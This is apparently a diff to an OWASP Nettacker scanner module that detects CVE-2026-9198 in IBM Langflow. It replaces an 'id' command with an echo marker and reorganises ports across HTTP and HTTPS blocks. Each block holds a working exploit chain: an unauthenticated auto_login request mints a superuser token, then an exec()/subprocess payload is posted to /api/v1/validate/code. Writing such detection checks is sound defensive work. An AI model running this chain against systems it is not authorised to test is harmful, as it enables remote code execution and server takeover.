@@ -3,9 +3,11 @@ info:
   author: OWASP Nettacker Team
   severity: 9.8
   description: >
-    IBM Langflow OSS 1.0.0 through 1.10.0 allows unauthenticated attackers to chain 
-    /api/v1/auto_login (mints SUPERUSER tokens to any network caller) with /api/v1/validate/code 
-    (executes user code via exec()) to achieve full RCE on default Langflow deployments
+    Default deployments of IBM Langflow OSS (versions 1.0.0 through 1.10.0) configured with 
+    LANGFLOW_AUTO_LOGIN=True are vulnerable to RCE.
+    The /api/v1/auto_login endpoint mints superuser tokens for any network caller without 
+    authentication: an attacker can leverage these credentials to access the /api/v1/validate/code 
+    endpoint and execute arbitrary Python code via the backend exec() function.
   references:
     - https://nvd.nist.gov/vuln/detail/CVE-2026-9198
     - https://www.ibm.com/support/pages/security-bulletin-unauthenticated-remote-code-execution-auto-login-bypass-and-code-validation
@@ -39,9 +41,8 @@ payloads:
                 - "http"
               ports:
                 - 7860 
-                - 80
         response:
-          save_to_temp_events_only: get_http_superuser_jwt
+          save_to_temp_events_only: get_http_default_superuser_jwt
           condition_type: and
           conditions:
             content: 
@@ -58,8 +59,8 @@ payloads:
         allow_redirects: false
         ssl: false
         json:
-          code: |
-            def foo(rce=exec("raise Exception(__import__('subprocess').check_output(['id'], shell=True, stderr=__import__('subprocess').STDOUT).decode())")):
+          code: | 
+            def foo(rce=exec("raise Exception(__import__('subprocess').check_output('echo OWASP-NETTACKER-CVE-2026-9198', shell=True, text=True, stderr=__import__('subprocess').STDOUT))")):
                 pass
         url:
           nettacker_fuzzer:
@@ -72,16 +73,15 @@ payloads:
                 - "http"
               ports:
                 - 7860 
-                - 80
         response:
-          dependent_on_temp_event: get_http_superuser_jwt
+          dependent_on_temp_event: get_http_default_superuser_jwt
           condition_type: and
           conditions:
             status_code:
               regex: "200"
               reverse: false
             content:
-              regex: "uid=[0-9]+\\(.*\\)"
+              regex: OWASP-NETTACKER-CVE-2026-9198
               reverse: false
 
   - library: http
@@ -101,7 +101,128 @@ payloads:
               schema:
                 - "https"
               ports:
-                - 7860
+                - 7860 
+        response:
+          save_to_temp_events_only: get_https_default_superuser_jwt
+          condition_type: and
+          conditions:
+            content: 
+              regex: 'access_token"\s*:\s*"([A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)'
+              reverse: false
+      
+      - method: post
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          Authorization: "Bearer dependent_on_temp_event[0]['content'][0]"
+          Content-Type: "application/json"
+          Accept: "application/json"
+        allow_redirects: false
+        ssl: false
+        json:
+          code: | 
+            def foo(rce=exec("raise Exception(__import__('subprocess').check_output('echo OWASP-NETTACKER-CVE-2026-9198', shell=True, text=True, stderr=__import__('subprocess').STDOUT))")):
+                pass
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/api/v1/validate/code"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "https"
+              ports:
+                - 7860 
+        response:
+          dependent_on_temp_event: get_https_default_superuser_jwt
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: OWASP-NETTACKER-CVE-2026-9198
+              reverse: false
+
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/api/v1/auto_login"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+              ports:
+                - 80
+        response:
+          save_to_temp_events_only: get_http_superuser_jwt
+          condition_type: and
+          conditions:
+            content: 
+              regex: 'access_token"\s*:\s*"([A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)'
+              reverse: false
+      
+      - method: post
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          Authorization: "Bearer dependent_on_temp_event[0]['content'][0]"
+          Content-Type: "application/json"
+          Accept: "application/json"
+        allow_redirects: false
+        ssl: false
+        json:
+          code: | 
+            def foo(rce=exec("raise Exception(__import__('subprocess').check_output('echo OWASP-NETTACKER-CVE-2026-9198', shell=True, text=True, stderr=__import__('subprocess').STDOUT))")):
+                pass
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/api/v1/validate/code"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+              ports:
+                - 80 
+        response:
+          dependent_on_temp_event: get_http_superuser_jwt
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: OWASP-NETTACKER-CVE-2026-9198
+              reverse: false
+
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/api/v1/auto_login"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "https"
+              ports:
                 - 443
         response:
           save_to_temp_events_only: get_https_superuser_jwt
@@ -121,8 +242,8 @@ payloads:
         allow_redirects: false
         ssl: false
         json:
-          code: |
-            def foo(rce=exec("raise Exception(__import__('subprocess').check_output(['id'], shell=True, stderr=__import__('subprocess').STDOUT).decode())")):
+          code: | 
+            def foo(rce=exec("raise Exception(__import__('subprocess').check_output('echo OWASP-NETTACKER-CVE-2026-9198', shell=True, text=True, stderr=__import__('subprocess').STDOUT))")):
                 pass
         url:
           nettacker_fuzzer:
@@ -134,7 +255,6 @@ payloads:
               schema:
                 - "https"
               ports:
-                - 7860 
                 - 443
         response:
           dependent_on_temp_event: get_https_superuser_jwt
@@ -144,5 +264,5 @@ payloads:
               regex: "200"
               reverse: false
             content:
-              regex: "uid=[0-9]+\\(.*\\)"
+              regex: OWASP-NETTACKER-CVE-2026-9198
               reverse: false     
